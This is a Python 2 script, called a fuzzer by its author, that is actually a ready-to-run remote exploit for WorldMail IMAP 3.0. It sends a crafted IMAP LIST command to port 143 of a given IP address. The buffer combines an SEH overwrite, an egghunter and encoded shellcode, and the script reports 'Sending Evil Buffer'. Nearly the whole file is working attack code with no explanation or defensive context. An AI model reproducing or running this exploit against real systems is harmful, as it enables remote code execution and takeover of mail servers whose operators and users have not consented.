#!/usr/bin/python
#Name: Rio Atmadja
#Script: python fuzzer for worldmail imap 3.0
import sys
import struct
import socket
from time import sleep

if(len(sys.argv) < 2):
	print"\n[x] Usage: python "+sys.argv[0]+" < ip_server >\n"
	sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ( "w00tw00t" + "\xdd\xc0\xbe\x03\x96\xb9\x3e\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x4f\x31\x70\x19\x83\xc0\x04\x03\x70\x15\xe1\x63\x45\xd6\x6c"
"\x8b\xb6\x27\x0e\x05\x53\x16\x1c\x71\x17\x0b\x90\xf1\x75\xa0"
"\x5b\x57\x6e\x33\x29\x70\x81\xf4\x87\xa6\xac\x05\x26\x67\x62"
"\xc5\x29\x1b\x79\x1a\x89\x22\xb2\x6f\xc8\x63\xaf\x80\x98\x3c"
"\xbb\x33\x0c\x48\xf9\x8f\x2d\x9e\x75\xaf\x55\x9b\x4a\x44\xef"
"\xa2\x9a\xf5\x64\xec\x02\x7d\x22\xcd\x33\x52\x31\x31\x7d\xdf"
"\x81\xc1\x7c\x09\xd8\x2a\x4f\x75\xb6\x14\x7f\x78\xc7\x51\xb8"
"\x63\xb2\xa9\xba\x1e\xc4\x69\xc0\xc4\x41\x6c\x62\x8e\xf1\x54"
"\x92\x43\x67\x1e\x98\x28\xec\x78\xbd\xaf\x21\xf3\xb9\x24\xc4"
"\xd4\x4b\x7e\xe2\xf0\x10\x24\x8b\xa1\xfc\x8b\xb4\xb2\x59\x73"
"\x10\xb8\x48\x60\x22\xe3\x04\x45\x18\x1c\xd5\xc1\x2b\x6f\xe7"
"\x4e\x87\xe7\x4b\x06\x01\xff\xac\x3d\xf5\x6f\x53\xbe\x05\xb9"
"\x90\xea\x55\xd1\x31\x93\x3e\x21\xbd\x46\x90\x71\x11\x39\x50"
"\x22\xd1\xe9\x38\x28\xde\xd6\x58\x53\x34\x61\x5f\xc4\x77\xda"
"\x55\x14\x10\x19\x69\x17\x5b\x94\x8f\x7d\x8b\xf1\x18\xea\x32"
"\x58\xd2\x8b\xbb\x76\x72\x2f\x29\x1d\x82\x26\x52\x8a\xd5\x6f"
"\xa4\xc3\xb3\x9d\x9f\x7d\xa1\x5f\x79\x45\x61\x84\xba\x48\x68"
"\x49\x86\x6e\x7a\x97\x07\x2b\x2e\x47\x5e\xe5\x98\x21\x08\x47"
"\x72\xf8\xe7\x01\x12\x7d\xc4\x91\x64\x82\x01\x64\x88\x33\xfc"
"\x31\xb7\xfc\x68\xb6\xc0\xe0\x08\x39\x1b\xa1\x39\x70\x01\x80"
"\xd1\xdd\xd0\x90\xbf\xdd\x0f\xd6\xb9\x5d\xa5\xa7\x3d\x7d\xcc"
"\xa2\x7a\x39\x3d\xdf\x13\xac\x41\x4c\x13\xe5")

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

seh = "\xed\x57\x00\x60" #0x600057ed
buffer =  '\x41' * (770 - len(shellcode) )  + shellcode + "\xeb\x06\x90\x90" + seh  + egghunter +  '\x90' * 16   + '\x7d' 

try: 
	s.connect((sys.argv[1],143))
except: 
	print "[-] Connection Error"
	response = s.recv(1024)
	print response 
	sys.exit(1)

data=s.recv(1024)
print "Sending Evil Buffer --> " + str(len(buffer)) + " Bytes"
s.send('a001 LIST '+ buffer +'\r\n')
s.close()
print "[+] Exploit Send Sucsessfully\n" 
